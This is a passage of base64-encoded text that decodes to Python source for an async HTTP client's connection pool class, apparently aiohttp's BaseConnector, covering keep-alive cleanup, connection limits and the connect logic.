RpbWVvdXQgaXMgbm90IE5vbmUgYW5kIGtlZXBhbGl2ZV90aW1lb3V0IGlzIG5vdCBzZW50aW5lbDpcclxuICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgImtlZXBhbGl2ZV90aW1lb3V0IGNhbm5vdCAiICJiZSBzZXQgaWYgZm9yY2VfY2xvc2UgaXMgVHJ1ZSJcclxuICAgICAgICAgICAgICAgIClcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBpZiBrZWVwYWxpdmVfdGltZW91dCBpcyBzZW50aW5lbDpcclxuICAgICAgICAgICAgICAgIGtlZXBhbGl2ZV90aW1lb3V0ID0gMTUuMFxyXG5cclxuICAgICAgICBsb29wID0gZ2V0X3J1bm5pbmdfbG9vcChsb29wKVxyXG5cclxuICAgICAgICBzZWxmLl9jbG9zZWQgPSBGYWxzZVxyXG4gICAgICAgIGlmIGxvb3AuZ2V0X2RlYnVnKCk6XHJcbiAgICAgICAgICAgIHNlbGYuX3NvdXJjZV90cmFjZWJhY2sgPSB0cmFjZWJhY2suZXh0cmFjdF9zdGFjayhzeXMuX2dldGZyYW1lKDEpKVxyXG5cclxuICAgICAgICBzZWxmLl9jb25ucyA9IChcclxuICAgICAgICAgICAge31cclxuICAgICAgICApICAjIHR5cGU6IERpY3RbQ29ubmVjdGlvbktleSwgTGlzdFtUdXBsZVtSZXNwb25zZUhhbmRsZXIsIGZsb2F0XV1dXHJcbiAgICAgICAgc2VsZi5fbGltaXQgPSBsaW1pdFxyXG4gICAgICAgIHNlbGYuX2xpbWl0X3Blcl9ob3N0ID0gbGltaXRfcGVyX2hvc3RcclxuICAgICAgICBzZWxmLl9hY3F1aXJlZCA9IHNldCgpICAjIHR5cGU6IFNldFtSZXNwb25zZUhhbmRsZXJdXHJcbiAgICAgICAgc2VsZi5fYWNxdWlyZWRfcGVyX2hvc3QgPSBkZWZhdWx0ZGljdChcclxuICAgICAgICAgICAgc2V0XHJcbiAgICAgICAgKSAgIyB0eXBlOiBEZWZhdWx0RGljdFtDb25uZWN0aW9uS2V5LCBTZXRbUmVzcG9uc2VIYW5kbGVyXV1cclxuICAgICAgICBzZWxmLl9rZWVwYWxpdmVfdGltZW91dCA9IGNhc3QoZmxvYXQsIGtlZXBhbGl2ZV90aW1lb3V0KVxyXG4gICAgICAgIHNlbGYuX2ZvcmNlX2Nsb3NlID0gZm9yY2VfY2xvc2VcclxuXHJcbiAgICAgICAgIyB7aG9zdF9rZXk6IEZJRk8gbGlzdCBvZiB3YWl0ZXJzfVxyXG4gICAgICAgIHNlbGYuX3dhaXRlcnMgPSBkZWZhdWx0ZGljdChkZXF1ZSkgICMgdHlwZTogaWdub3JlW3Zhci1hbm5vdGF0ZWRdXHJcblxyXG4gICAgICAgIHNlbGYuX2xvb3AgPSBsb29wXHJcbiAgICAgICAgc2VsZi5fZmFjdG9yeSA9IGZ1bmN0b29scy5wYXJ0aWFsKFJlc3BvbnNlSGFuZGxlciwgbG9vcD1sb29wKVxyXG5cclxuICAgICAgICBzZWxmLmNvb2tpZXMgPSBTaW1wbGVDb29raWUoKSAgIyB0eXBlOiBTaW1wbGVDb29raWVbc3RyXVxyXG5cclxuICAgICAgICAjIHN0YXJ0IGtlZXAtYWxpdmUgY29ubmVjdGlvbiBjbGVhbnVwIHRhc2tcclxuICAgICAgICBzZWxmLl9jbGVhbnVwX2hhbmRsZTogT3B0aW9uYWxbYXN5bmNpby5UaW1lckhhbmRsZV0gPSBOb25lXHJcblxyXG4gICAgICAgICMgc3RhcnQgY2xlYW51cCBjbG9zZWQgdHJhbnNwb3J0cyB0YXNrXHJcbiAgICAgICAgc2VsZi5fY2xlYW51cF9jbG9zZWRfaGFuZGxlOiBPcHRpb25hbFthc3luY2lvLlRpbWVySGFuZGxlXSA9IE5vbmVcclxuICAgICAgICBzZWxmLl9jbGVhbnVwX2Nsb3NlZF9kaXNhYmxlZCA9IG5vdCBlbmFibGVfY2xlYW51cF9jbG9zZWRcclxuICAgICAgICBzZWxmLl9jbGVhbnVwX2Nsb3NlZF90cmFuc3BvcnRzID0gW10gICMgdHlwZTogTGlzdFtPcHRpb25hbFthc3luY2lvLlRyYW5zcG9ydF1dXHJcbiAgICAgICAgc2VsZi5fY2xlYW51cF9jbG9zZWQoKVxyXG5cclxuICAgIGRlZiBfX2RlbF9fKHNlbGYsIF93YXJuaW5nczogQW55ID0gd2FybmluZ3MpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgc2VsZi5fY2xvc2VkOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuICAgICAgICBpZiBub3Qgc2VsZi5fY29ubnM6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICBjb25ucyA9IFtyZXByKGMpIGZvciBjIGluIHNlbGYuX2Nvbm5zLnZhbHVlcygpXVxyXG5cclxuICAgICAgICBzZWxmLl9jbG9zZSgpXHJcblxyXG4gICAgICAgIGlmIFBZXzM2OlxyXG4gICAgICAgICAgICBrd2FyZ3MgPSB7InNvdXJjZSI6IHNlbGZ9XHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAga3dhcmdzID0ge31cclxuICAgICAgICBfd2FybmluZ3Mud2FybihmIlVuY2xvc2VkIGNvbm5lY3RvciB7c2VsZiFyfSIsIFJlc291cmNlV2FybmluZywgKiprd2FyZ3MpXHJcbiAgICAgICAgY29udGV4dCA9IHtcclxuICAgICAgICAgICAgImNvbm5lY3RvciI6IHNlbGYsXHJcbiAgICAgICAgICAgICJjb25uZWN0aW9ucyI6IGNvbm5zLFxyXG4gICAgICAgICAgICAibWVzc2FnZSI6ICJVbmNsb3NlZCBjb25uZWN0b3IiLFxyXG4gICAgICAgIH1cclxuICAgICAgICBpZiBzZWxmLl9zb3VyY2VfdHJhY2ViYWNrIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICBjb250ZXh0WyJzb3VyY2VfdHJhY2ViYWNrIl0gPSBzZWxmLl9zb3VyY2VfdHJhY2ViYWNrXHJcbiAgICAgICAgc2VsZi5fbG9vcC5jYWxsX2V4Y2VwdGlvbl9oYW5kbGVyKGNvbnRleHQpXHJcblxyXG4gICAgZGVmIF9fZW50ZXJfXyhzZWxmKSAtPiAiQmFzZUNvbm5lY3RvciI6XHJcbiAgICAgICAgd2FybmluZ3Mud2FybihcclxuICAgICAgICAgICAgXCcid2l0biBDb25uZWN0b3IoKToiIGlzIGRlcHJlY2F0ZWQsIFwnXHJcbiAgICAgICAgICAgIFwndXNlICJhc3luYyB3aXRoIENvbm5lY3RvcigpOiIgaW5zdGVhZFwnLFxyXG4gICAgICAgICAgICBEZXByZWNhdGlvbldhcm5pbmcsXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHJldHVybiBzZWxmXHJcblxyXG4gICAgZGVmIF9fZXhpdF9fKHNlbGYsICpleGM6IEFueSkgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNsb3NlKClcclxuXHJcbiAgICBhc3luYyBkZWYgX19hZW50ZXJfXyhzZWxmKSAtPiAiQmFzZUNvbm5lY3RvciI6XHJcbiAgICAgICAgcmV0dXJuIHNlbGZcclxuXHJcbiAgICBhc3luYyBkZWYgX19hZXhpdF9fKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgZXhjX3R5cGU6IE9wdGlvbmFsW1R5cGVbQmFzZUV4Y2VwdGlvbl1dID0gTm9uZSxcclxuICAgICAgICBleGNfdmFsdWU6IE9wdGlvbmFsW0Jhc2VFeGNlcHRpb25dID0gTm9uZSxcclxuICAgICAgICBleGNfdHJhY2ViYWNrOiBPcHRpb25hbFtUcmFjZWJhY2tUeXBlXSA9IE5vbmUsXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgYXdhaXQgc2VsZi5jbG9zZSgpXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgZm9yY2VfY2xvc2Uoc2VsZikgLT4gYm9vbDpcclxuICAgICAgICAiIiJVbHRpbWF0ZWx5IGNsb3NlIGNvbm5lY3Rpb24gb24gcmVsZWFzaW5nIGlmIFRydWUuIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2ZvcmNlX2Nsb3NlXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgbGltaXQoc2VsZikgLT4gaW50OlxyXG4gICAgICAgICIiIlRoZSB0b3RhbCBudW1iZXIgZm9yIHNpbXVsdGFuZW91cyBjb25uZWN0aW9ucy5cclxuXHJcbiAgICAgICAgSWYgbGltaXQgaXMgMCB0aGUgY29ubmVjdG9yIGhhcyBubyBsaW1pdC5cclxuICAgICAgICBUaGUgZGVmYXVsdCBsaW1pdCBzaXplIGlzIDEwMC5cclxuICAgICAgICAiIiJcclxuICAgICAgICByZXR1cm4gc2VsZi5fbGltaXRcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBsaW1pdF9wZXJfaG9zdChzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgIiIiVGhlIGxpbWl0IGZvciBzaW11bHRhbmVvdXMgY29ubmVjdGlvbnMgdG8gdGhlIHNhbWUgZW5kcG9pbnQuXHJcblxyXG4gICAgICAgIEVuZHBvaW50cyBhcmUgdGhlIHNhbWUgaWYgdGhleSBhcmUgaGF2ZSBlcXVhbFxyXG4gICAgICAgIChob3N0LCBwb3J0LCBpc19zc2wpIHRyaXBsZS5cclxuICAgICAgICAiIiJcclxuICAgICAgICByZXR1cm4gc2VsZi5fbGltaXRfcGVyX2hvc3RcclxuXHJcbiAgICBkZWYgX2NsZWFudXAoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICAiIiJDbGVhbnVwIHVudXNlZCB0cmFuc3BvcnRzLiIiIlxyXG4gICAgICAgIGlmIHNlbGYuX2NsZWFudXBfaGFuZGxlOlxyXG4gICAgICAgICAgICBzZWxmLl9jbGVhbnVwX2hhbmRsZS5jYW5jZWwoKVxyXG4gICAgICAgICAgICAjIF9jbGVhbnVwX2hhbmRsZSBzaG91bGQgYmUgdW5zZXQsIG90aGVyd2lzZSBfcmVsZWFzZSgpIHdpbGwgbm90XHJcbiAgICAgICAgICAgICMgcmVjcmVhdGUgaXQgZXZlciFcclxuICAgICAgICAgICAgc2VsZi5fY2xlYW51cF9oYW5kbGUgPSBOb25lXHJcblxyXG4gICAgICAgIG5vdyA9IHNlbGYuX2xvb3AudGltZSgpXHJcbiAgICAgICAgdGltZW91dCA9IHNlbGYuX2tlZXBhbGl2ZV90aW1lb3V0XHJcblxyXG4gICAgICAgIGlmIHNlbGYuX2Nvbm5zOlxyXG4gICAgICAgICAgICBjb25uZWN0aW9ucyA9IHt9XHJcbiAgICAgICAgICAgIGRlYWRsaW5lID0gbm93IC0gdGltZW91dFxyXG4gICAgICAgICAgICBmb3Iga2V5LCBjb25ucyBpbiBzZWxmLl9jb25ucy5pdGVtcygpOlxyXG4gICAgICAgICAgICAgICAgYWxpdmUgPSBbXVxyXG4gICAgICAgICAgICAgICAgZm9yIHByb3RvLCB1c2VfdGltZSBpbiBjb25uczpcclxuICAgICAgICAgICAgICAgICAgICBpZiBwcm90by5pc19jb25uZWN0ZWQoKTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgdXNlX3RpbWUgLSBkZWFkbGluZSA8IDA6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cmFuc3BvcnQgPSBwcm90by50cmFuc3BvcnRcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByb3RvLmNsb3NlKClcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGtleS5pc19zc2wgYW5kIG5vdCBzZWxmLl9jbGVhbnVwX2Nsb3NlZF9kaXNhYmxlZDpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLl9jbGVhbnVwX2Nsb3NlZF90cmFuc3BvcnRzLmFwcGVuZCh0cmFuc3BvcnQpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhbGl2ZS5hcHBlbmQoKHByb3RvLCB1c2VfdGltZSkpXHJcbiAgICAgICAgICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgdHJhbnNwb3J0ID0gcHJvdG8udHJhbnNwb3J0XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHByb3RvLmNsb3NlKClcclxuICAgICAgICAgICAgICAgICAgICAgICAgaWYga2V5LmlzX3NzbCBhbmQgbm90IHNlbGYuX2NsZWFudXBfY2xvc2VkX2Rpc2FibGVkOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5fY2xlYW51cF9jbG9zZWRfdHJhbnNwb3J0cy5hcHBlbmQodHJhbnNwb3J0KVxyXG5cclxuICAgICAgICAgICAgICAgIGlmIGFsaXZlOlxyXG4gICAgICAgICAgICAgICAgICAgIGNvbm5lY3Rpb25zW2tleV0gPSBhbGl2ZVxyXG5cclxuICAgICAgICAgICAgc2VsZi5fY29ubnMgPSBjb25uZWN0aW9uc1xyXG5cclxuICAgICAgICBpZiBzZWxmLl9jb25uczpcclxuICAgICAgICAgICAgc2VsZi5fY2xlYW51cF9oYW5kbGUgPSBoZWxwZXJzLndlYWtyZWZfaGFuZGxlKFxyXG4gICAgICAgICAgICAgICAgc2VsZiwgIl9jbGVhbnVwIiwgdGltZW91dCwgc2VsZi5fbG9vcFxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgZGVmIF9kcm9wX2FjcXVpcmVkX3Blcl9ob3N0KFxyXG4gICAgICAgIHNlbGYsIGtleTogIkNvbm5lY3Rpb25LZXkiLCB2YWw6IFJlc3BvbnNlSGFuZGxlclxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIGFjcXVpcmVkX3Blcl9ob3N0ID0gc2VsZi5fYWNxdWlyZWRfcGVyX2hvc3RcclxuICAgICAgICBpZiBrZXkgbm90IGluIGFjcXVpcmVkX3Blcl9ob3N0OlxyXG4gICAgICAgICAgICByZXR1cm5cclxuICAgICAgICBjb25ucyA9IGFjcXVpcmVkX3Blcl9ob3N0W2tleV1cclxuICAgICAgICBjb25ucy5yZW1vdmUodmFsKVxyXG4gICAgICAgIGlmIG5vdCBjb25uczpcclxuICAgICAgICAgICAgZGVsIHNlbGYuX2FjcXVpcmVkX3Blcl9ob3N0W2tleV1cclxuXHJcbiAgICBkZWYgX2NsZWFudXBfY2xvc2VkKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiRG91YmxlIGNvbmZpcm1hdGlvbiBmb3IgdHJhbnNwb3J0IGNsb3NlLlxyXG5cclxuICAgICAgICBTb21lIGJyb2tlbiBzc2wgc2VydmVycyBtYXkgbGVhdmUgc29ja2V0IG9wZW4gd2l0aG91dCBwcm9wZXIgY2xvc2UuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgaWYgc2VsZi5fY2xlYW51cF9jbG9zZWRfaGFuZGxlOlxyXG4gICAgICAgICAgICBzZWxmLl9jbGVhbnVwX2Nsb3NlZF9oYW5kbGUuY2FuY2VsKClcclxuXHJcbiAgICAgICAgZm9yIHRyYW5zcG9ydCBpbiBzZWxmLl9jbGVhbnVwX2Nsb3NlZF90cmFuc3BvcnRzOlxyXG4gICAgICAgICAgICBpZiB0cmFuc3BvcnQgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgICAgICB0cmFuc3BvcnQuYWJvcnQoKVxyXG5cclxuICAgICAgICBzZWxmLl9jbGVhbnVwX2Nsb3NlZF90cmFuc3BvcnRzID0gW11cclxuXHJcbiAgICAgICAgaWYgbm90IHNlbGYuX2NsZWFudXBfY2xvc2VkX2Rpc2FibGVkOlxyXG4gICAgICAgICAgICBzZWxmLl9jbGVhbnVwX2Nsb3NlZF9oYW5kbGUgPSBoZWxwZXJzLndlYWtyZWZfaGFuZGxlKFxyXG4gICAgICAgICAgICAgICAgc2VsZiwgIl9jbGVhbnVwX2Nsb3NlZCIsIHNlbGYuX2NsZWFudXBfY2xvc2VkX3BlcmlvZCwgc2VsZi5fbG9vcFxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgZGVmIGNsb3NlKHNlbGYpIC0+IEF3YWl0YWJsZVtOb25lXTpcclxuICAgICAgICAiIiJDbG9zZSBhbGwgb3BlbmVkIHRyYW5zcG9ydHMuIiIiXHJcbiAgICAgICAgc2VsZi5fY2xvc2UoKVxyXG4gICAgICAgIHJldHVybiBfRGVwcmVjYXRpb25XYWl0ZXIobm9vcCgpKVxyXG5cclxuICAgIGRlZiBfY2xvc2Uoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBpZiBzZWxmLl9jbG9zZWQ6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICBzZWxmLl9jbG9zZWQgPSBUcnVlXHJcblxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgaWYgc2VsZi5fbG9vcC5pc19jbG9zZWQoKTpcclxuICAgICAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICAgICAgIyBjYW5jZWwgY2xlYW51cCB0YXNrXHJcbiAgICAgICAgICAgIGlmIHNlbGYuX2NsZWFudXBfaGFuZGxlOlxyXG4gICAgICAgICAgICAgICAgc2VsZi5fY2xlYW51cF9oYW5kbGUuY2FuY2VsKClcclxuXHJcbiAgICAgICAgICAgICMgY2FuY2VsIGNsZWFudXAgY2xvc2UgdGFza1xyXG4gICAgICAgICAgICBpZiBzZWxmLl9jbGVhbnVwX2Nsb3NlZF9oYW5kbGU6XHJcbiAgICAgICAgICAgICAgICBzZWxmLl9jbGVhbnVwX2Nsb3NlZF9oYW5kbGUuY2FuY2VsKClcclxuXHJcbiAgICAgICAgICAgIGZvciBkYXRhIGluIHNlbGYuX2Nvbm5zLnZhbHVlcygpOlxyXG4gICAgICAgICAgICAgICAgZm9yIHByb3RvLCB0MCBpbiBkYXRhOlxyXG4gICAgICAgICAgICAgICAgICAgIHByb3RvLmNsb3NlKClcclxuXHJcbiAgICAgICAgICAgIGZvciBwcm90byBpbiBzZWxmLl9hY3F1aXJlZDpcclxuICAgICAgICAgICAgICAgIHByb3RvLmNsb3NlKClcclxuXHJcbiAgICAgICAgICAgIGZvciB0cmFuc3BvcnQgaW4gc2VsZi5fY2xlYW51cF9jbG9zZWRfdHJhbnNwb3J0czpcclxuICAgICAgICAgICAgICAgIGlmIHRyYW5zcG9ydCBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgICAgICAgICB0cmFuc3BvcnQuYWJvcnQoKVxyXG5cclxuICAgICAgICBmaW5hbGx5OlxyXG4gICAgICAgICAgICBzZWxmLl9jb25ucy5jbGVhcigpXHJcbiAgICAgICAgICAgIHNlbGYuX2FjcXVpcmVkLmNsZWFyKClcclxuICAgICAgICAgICAgc2VsZi5fd2FpdGVycy5jbGVhcigpXHJcbiAgICAgICAgICAgIHNlbGYuX2NsZWFudXBfaGFuZGxlID0gTm9uZVxyXG4gICAgICAgICAgICBzZWxmLl9jbGVhbnVwX2Nsb3NlZF90cmFuc3BvcnRzLmNsZWFyKClcclxuICAgICAgICAgICAgc2VsZi5fY2xlYW51cF9jbG9zZWRfaGFuZGxlID0gTm9uZVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGNsb3NlZChzZWxmKSAtPiBib29sOlxyXG4gICAgICAgICIiIklzIGNvbm5lY3RvciBjbG9zZWQuXHJcblxyXG4gICAgICAgIEEgcmVhZG9ubHkgcHJvcGVydHkuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2Nsb3NlZFxyXG5cclxuICAgIGRlZiBfYXZhaWxhYmxlX2Nvbm5lY3Rpb25zKHNlbGYsIGtleTogIkNvbm5lY3Rpb25LZXkiKSAtPiBpbnQ6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgUmV0dXJuIG51bWJlciBvZiBhdmFpbGFibGUgY29ubmVjdGlvbnMuXHJcblxyXG4gICAgICAgIFRoZSBsaW1pdCwgbGltaXRfcGVyX2hvc3QgYW5kIHRoZSBjb25uZWN0aW9uIGtleSBhcmUgdGFrZW4gaW50byBhY2NvdW50LlxyXG5cclxuICAgICAgICBJZiBpdCByZXR1cm5zIGxlc3MgdGhhbiAxIG1lYW5zIHRoYXQgdGhlcmUgYXJlIG5vIGNvbm5lY3Rpb25zXHJcbiAgICAgICAgYXZhaWxhYmxlLlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIGlmIHNlbGYuX2xpbWl0OlxyXG4gICAgICAgICAgICAjIHRvdGFsIGNhbGMgYXZhaWxhYmxlIGNvbm5lY3Rpb25zXHJcbiAgICAgICAgICAgIGF2YWlsYWJsZSA9IHNlbGYuX2xpbWl0IC0gbGVuKHNlbGYuX2FjcXVpcmVkKVxyXG5cclxuICAgICAgICAgICAgIyBjaGVjayBsaW1pdCBwZXIgaG9zdFxyXG4gICAgICAgICAgICBpZiAoXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9saW1pdF9wZXJfaG9zdFxyXG4gICAgICAgICAgICAgICAgYW5kIGF2YWlsYWJsZSA+IDBcclxuICAgICAgICAgICAgICAgIGFuZCBrZXkgaW4gc2VsZi5fYWNxdWlyZWRfcGVyX2hvc3RcclxuICAgICAgICAgICAgKTpcclxuICAgICAgICAgICAgICAgIGFjcXVpcmVkID0gc2VsZi5fYWNxdWlyZWRfcGVyX2hvc3QuZ2V0KGtleSlcclxuICAgICAgICAgICAgICAgIGFzc2VydCBhY3F1aXJlZCBpcyBub3QgTm9uZVxyXG4gICAgICAgICAgICAgICAgYXZhaWxhYmxlID0gc2VsZi5fbGltaXRfcGVyX2hvc3QgLSBsZW4oYWNxdWlyZWQpXHJcblxyXG4gICAgICAgIGVsaWYgc2VsZi5fbGltaXRfcGVyX2hvc3QgYW5kIGtleSBpbiBzZWxmLl9hY3F1aXJlZF9wZXJfaG9zdDpcclxuICAgICAgICAgICAgIyBjaGVjayBsaW1pdCBwZXIgaG9zdFxyXG4gICAgICAgICAgICBhY3F1aXJlZCA9IHNlbGYuX2FjcXVpcmVkX3Blcl9ob3N0LmdldChrZXkpXHJcbiAgICAgICAgICAgIGFzc2VydCBhY3F1aXJlZCBpcyBub3QgTm9uZVxyXG4gICAgICAgICAgICBhdmFpbGFibGUgPSBzZWxmLl9saW1pdF9wZXJfaG9zdCAtIGxlbihhY3F1aXJlZClcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBhdmFpbGFibGUgPSAxXHJcblxyXG4gICAgICAgIHJldHVybiBhdmFpbGFibGVcclxuXHJcbiAgICBhc3luYyBkZWYgY29ubmVjdChcclxuICAgICAgICBzZWxmLCByZXE6ICJDbGllbnRSZXF1ZXN0IiwgdHJhY2VzOiBMaXN0WyJUcmFjZSJdLCB0aW1lb3V0OiAiQ2xpZW50VGltZW91dCJcclxuICAgICkgLT4gQ29ubmVjdGlvbjpcclxuICAgICAgICAiIiJHZXQgZnJvbSBwb29sIG9yIGNyZWF0ZSBuZXcgY29ubmVjdGlvbi4iIiJcclxuICAgICAgICBrZXkgPSByZXEuY29ubmVjdGlvbl9rZXlcclxuICAgICAgICBhdmFpbGFibGUgPSBzZWxmLl9hdmFpbGFibGVfY29ubmVjdGlvbnMoa2V5KVxyXG5cclxuICAgICAgICAjIFdhaXQgaWYgdGhlcmUgYXJlIG5vIGF2YWlsYWJsZSBjb25uZWN0aW9ucyBvciBpZiB0aGVyZSBhcmUvd2VyZVxyXG4gICAgICAgICMgd2FpdGVycyAoaS5lLiBkb25cJ3Qgc3RlYWwgY29ubmVjdGlvbiBmcm9tIGEgd2FpdGVyIGFib3V0IHRvIHdha2UgdXApXHJcbiAgICAgICAgaWYgYXZhaWxhYmxlIDw9IDAgb3Iga2V5IGluIHNlbGYuX3dhaXRlcnM6XHJcbiAgICAgICAgICAgIGZ1dCA9IHNlbGYuX2xvb3AuY3JlYXRlX2Z1dHVyZSgpXHJcblxyXG4gICAgICAgICAgICAjIFRoaXMgY29ubmVjdGlvbiB3aWxsIG5vdyBjb3VudCB0b3dhcmRzIHRoZSBsaW1pdC5cclxuICAgICAgICAgICAgc2VsZi5fd2FpdGVyc1trZXldLmFwcGVuZChmdXQpXHJcblxyXG4gICAgICAgICAgICBpZiB0cmFjZXM6XHJcbiAgICAgICAgICAgICAgICBmb3IgdHJhY2UgaW4gdHJhY2VzOlxyXG4gICAgICAgICAgICAgICAgICAgIGF3YWl0IHRyYWNlLnNlbmRfY29ubmVjdGlvbl9xdWV1ZWRfc3RhcnQoKVxyXG5cclxuICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgYXdhaXQgZnV0XHJcbiAgICAgICAgICAgIGV4Y2VwdCBCYXNlRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgICAgICBpZiBrZXkgaW4gc2VsZi5fd2FpdGVyczpcclxuICAgICAgICAgICAgICAgICAgICAjIHJlbW92ZSBhIHdhaXRlciBldmVuIGlmIGl0IHdhcyBjYW5jZWxsZWQsIG5vcm1hbGx5IGl0XCdzXHJcbiAgICAgICAgICAgICAgICAgICAgIyAgcmVtb3ZlZCB3aGVuIGl0XCdzIG5vdGlmaWVkXHJcbiAgICAgICAgICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLl93YWl0ZXJzW2tleV0ucmVtb3ZlKGZ1dClcclxuICAgICAgICAgICAgICAgICAgICBleGNlcHQgVmFsdWVFcnJvcjogICMgZnV0IG1heSBubyBsb25nZXIgYmUgaW4gbGlzdFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBwYXNzXHJcblxyXG4gICAgICAgICAgICAgICAgcmFpc2UgZVxyXG4gICAgICAgICAgICBmaW5hbGx5OlxyXG4gICAgICAgICAgICAgICAgaWYga2V5IGluIHNlbGYuX3dhaXRlcnMgYW5kIG5vdCBzZWxmLl93YWl0ZXJzW2tleV06XHJcbiAgICAgICAgICAgICAgICAgICAgZGVsIHNlbGYuX3dhaXRlcnNba2V5XVxyXG5cclxuICAgICAgICAgICAgaWYgdHJhY2VzOlxyXG4gICAgICAgICAgICAgICAgZm9yIHRyYWNlIGluIHRyYWNlczpcclxuICAgICAgICAgICAgICAgICAgICBhd2FpdCB0cmFjZS5zZW5kX2Nvbm5lY3Rpb25fcXVldWVkX2VuZCgpXHJcblxyXG4gICAgICAgIHByb3RvID0gc2VsZi5fZ2V0KGtleSlcclxuICAgICAgICBpZiBwcm90byBpcyBOb25lOlxyXG4gICAgICAgICAgICBwbGFjZWhvbGRlciA9IGNhc3QoUmVzcG9uc2VIYW5kbGVyLCBfVHJhbnNwb3J0UGxhY2Vob2xkZXIoKSlcclxuICAgICAgICAgICAgc2VsZi5fYWNxdWlyZWQuYWRkKHBsYWNlaG9sZGVyKVxyXG4gICAgICAgICAgICBzZWxmLl9hY3F1aXJlZF9wZXJfaG9zdFtrZXldLmFkZChwbGFjZWhvbGRlcilcclxuXHJcbiAgICAgICAgICAgIGlmIHRyYWNlczpcclxuICAgICAgICAgICAgICAgIGZvciB0cmFjZSBpbiB0cmFjZXM6XHJcbiAgICAgICAgICAgICAgICAgICAgYXdhaXQgdHJhY2Uuc2VuZF9jb25uZWN0aW9uX2NyZWF0ZV9zdGFydCgpXHJcblxyXG4gICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICBwcm90byA9IGF3YWl0IHNlbGYuX2NyZWF0ZV9jb25uZWN0aW9uKHJlcSwgdHJhY2VzLCB0aW1lb3V0KVxyXG4gICAgICAgICAgICAgICAgaWYgc2VsZi5fY2xvc2VkOlxyXG4gICAgICAgICAgICAgICAgICAgIHByb3RvLmNsb3NlKClcclxuICAgICAgICAgICAgICAgICAgICByYWlzZSBDbGllbnRDb25uZWN0aW9uRXJyb3IoIkNvbm5lY3RvciBpcyBjbG9zZWQuIilcclxuICAgICAgICAgICAgZXhjZXB0IEJhc2VFeGNlcHRpb246XHJcbiAgICAgICAgICAgICAgICBpZiBub3Qgc2VsZi5fY2xvc2VkOlxyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuX2FjcXVpcmVkLnJlbW92ZShwbGFjZWhvbGRlcilcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLl9kcm9wX2FjcXVpcmVkX3Blcl9ob3N0KGtleSwgcGxhY2Vob2xkZXIpXHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5fcmVsZWFzZV93YWl0ZXIoKVxyXG4gICAgICAgICAgICAgICAgcmFpc2VcclxuICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgIGlmIG5vdCBzZWxmLl9jbG9zZWQ6XHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5fYWNxdWlyZWQucmVtb3ZlKHBsYWNlaG9sZGVyKVxyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuX2Ryb3BfYWNxdWlyZWRfcGVyX2hvc3Qoa2V5LCBwbGFjZWhvbGRlcilcclxuXHJcbiAgICAgICAgICAgIGlmIHRyYWNlczpcclxuICAgICAgICAgICAgICAgIGZvciB0cmFjZSBpbiB0cmFjZXM6XHJcbiAgICAgICAgICAgICAgICAgICAgYXdhaXQgdHJhY2Uuc2VuZF9jb25uZWN0aW9uX2NyZWF0ZV9lbmQoKVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIGlmIHRyYWNlczpcclxuICAgICAgICAgICAgICAgICMgQWNxdWlyZSB0aGUgY29ubmVjdGlvbiB0byBwcmV2Z